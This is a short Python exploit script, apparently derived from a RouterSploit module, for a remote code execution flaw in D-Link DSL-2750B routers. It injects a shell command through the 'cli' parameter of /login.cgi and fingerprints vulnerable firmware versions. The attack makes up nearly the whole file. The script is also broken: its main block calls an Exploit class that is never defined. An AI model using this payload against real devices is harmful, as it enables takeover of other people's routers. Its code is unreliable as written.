target = ""
# rsf exploit module
# description: Module exploits RCE vulnerability in D-Link DSL-2750B devices
import re
import requests

def execute(target, port, cmd):
    try:
        path = f"/login.cgi?cli=multilingual show';{cmd}'$"
        requests.get(f"http://{target}:{port}{path}", timeout=5)
        return True
    except:
        return False

def check(target, port=80):
    try:
        response = requests.get(f"http://{target}:{port}/ayefeaturesconvert.js", timeout=5)
        if response.status_code == 200 and "DSL-2750B" in response.text:
            version = re.findall(r"AYECOM_FWVER=\"(.*?)\";", response.text)
            if version and "1.01" <= version[0] <= "1.03":
                return True
        return False
    except:
        return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
